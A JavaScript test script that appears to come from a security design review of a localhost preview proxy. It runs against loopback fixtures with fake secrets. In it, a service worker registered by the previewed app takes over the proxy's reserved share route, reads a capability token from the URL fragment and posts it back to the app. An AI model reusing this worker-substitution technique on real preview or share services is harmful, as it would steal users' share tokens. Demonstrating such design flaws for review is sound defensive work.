// codex-heavy only. Actual current proxy, fake grants, owned loopback upstreams.
// Shows a design trap, not a vulnerability in a deployed public-share feature.
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { mkdir, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { LocalhostPreview } from '../dist-server/localhost-preview.js'
const { chromium } = await import('/tmp/working-hours-browser/node_modules/playwright/index.mjs')
const listen = server => new Promise(resolve => server.listen(0, '127.0.0.1', () => resolve(server.address().port)))
const canary = 'FAKE-SHARE-CAPABILITY-ONLY'
let browser, proxy, gateway, app, trusted, captured = '', reservedRequests = 0
try {
  const substituted = '<!doctype html><body>App worker replaced bootstrap</body><script>window.fragmentReadByApp=location.hash.slice(1);fetch("/capture",{method:"POST",body:window.fragmentReadByApp}).then(r=>r.text()).then(()=>window.captureComplete=true).catch(e=>window.captureFailure=String(e))</script>'
  app = createServer((req, res) => {
    if (req.url === '/sw.js') {
      res.writeHead(200, { 'Content-Type': 'text/javascript', 'Service-Worker-Allowed': '/' })
      res.end(`self.addEventListener('install',()=>self.skipWaiting());self.addEventListener('activate',event=>event.waitUntil(clients.claim()));self.addEventListener('fetch',event=>{if(new URL(event.request.url).pathname==='/__codex_preview__/share')event.respondWith(new Response(${JSON.stringify(substituted)},{headers:{'Content-Type':'text/html'}}))})`)
    } else if (req.url === '/capture') {
      req.on('data', chunk => { captured += chunk }); req.on('end', () => res.end('ok'))
    } else {
      res.writeHead(200, { 'Content-Type': 'text/html' })
      res.end('<!doctype html><body>Owned upstream fixture</body><script>navigator.serviceWorker.register("/sw.js",{scope:"/"})</script>')
    }
  })
  const appPort = await listen(app)
  gateway = createServer((req, res) => {
    if (req.url?.startsWith('/__codex_preview__/share')) reservedRequests++
    proxy.handle(req, res)
  })
  const gatewayPort = await listen(gateway)
  proxy = new LocalhostPreview({ originTemplate: `http://p{port}.localhost:${gatewayPort}`, sessionSecret: 'fake-design-review-secret'.repeat(3), blockedPorts: [gatewayPort] })
  const launch = proxy.createLaunch(appPort, '/', Math.floor(Date.now() / 1000) + 600)
  browser = await chromium.launch({ headless: true })
  const context = await browser.newContext(), page = await context.newPage()
  page.setDefaultTimeout(10000)
  const errors = []; page.on('pageerror', e => errors.push(e.message.replace(/ticket=[^&\s]+/g, 'ticket=[redacted]')))
  await page.goto(launch.url)
  await page.waitForFunction(() => Boolean(navigator.serviceWorker.controller)).catch(async error => { console.error(JSON.stringify({ body: await page.locator('body').innerText(), secureContext: await page.evaluate(() => isSecureContext), errors })); throw error })
  const origin = new URL(launch.viewUrl).origin
  await page.goto(`${origin}/__codex_preview__/share#${canary}`)
  await page.getByText('App worker replaced bootstrap', { exact: true }).waitFor()
  assert.equal(await page.evaluate(() => window.fragmentReadByApp), canary)
  await page.waitForFunction(() => window.captureComplete || window.captureFailure).catch(async error => { console.error(JSON.stringify({ capturedBytes: captured.length, errors })); throw error })
  assert.equal(captured, canary)
  assert.equal(reservedRequests, 0, 'Gateway reserved route/CSP never executes for worker substitution')

  // Positive boundary control: the app's root worker cannot replace a page on a
  // different trusted origin. This does not implement or approve grant exchange.
  trusted = createServer((_req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html', 'Cache-Control': 'no-store', 'Referrer-Policy': 'no-referrer' })
    res.end('<!doctype html><script>history.replaceState(null,"","/share");window.trustedBootstrap=true</script><body>Trusted bootstrap boundary</body>')
  })
  const trustedPort = await listen(trusted)
  await page.goto(`http://127.0.0.1:${trustedPort}/share#${canary}`)
  await page.getByText('Trusted bootstrap boundary', { exact: true }).waitFor()
  assert.equal(await page.evaluate(() => window.trustedBootstrap), true)
  assert.equal(await page.evaluate(() => navigator.serviceWorker.controller), null)
  assert.equal(new URL(page.url()).hash, '')
  const evidence = { baseline: '177e812c2f9b441f201bbdba365a252fdba63cf3', sameOriginAppWorkerReadFragment: true,
    fakeCapabilityReachedOwnedUpstream: true, reservedBootstrapRequestsReachedGateway: reservedRequests,
    differentOriginControl: true, realPublicShares: 0, realModelTurns: 0, productionMutation: false }
  if (process.env.SHARE_REVIEW_EVIDENCE) {
    await mkdir(process.env.SHARE_REVIEW_EVIDENCE, { recursive: true })
    await writeFile(join(process.env.SHARE_REVIEW_EVIDENCE, 'bootstrap-result.json'), JSON.stringify(evidence, null, 2) + '\n')
  }
  console.log(JSON.stringify(evidence))
} finally {
  await browser?.close(); proxy?.close()
  for (const server of [gateway, app, trusted]) if (server) { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)) }
}
